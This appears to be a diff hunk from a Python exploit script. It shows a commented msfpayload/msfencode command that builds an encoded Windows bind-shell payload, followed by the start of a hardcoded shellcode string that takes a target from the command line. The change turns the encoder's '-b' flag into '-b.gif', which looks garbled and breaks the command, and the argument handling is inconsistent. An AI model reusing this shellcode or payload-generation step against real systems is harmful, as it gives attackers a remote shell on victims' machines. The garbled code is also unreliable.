@@ -32,7 +32,7 @@ target = sys.argv[1]
 command = sys.argv[2]
 if len(sys.argv) > 2:
     platform = sys.argv[2]
-# ./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
+# ./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b.gif "\x00\xff\x0d\x0a\x3d\x20"
 # [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
 shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
              "\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
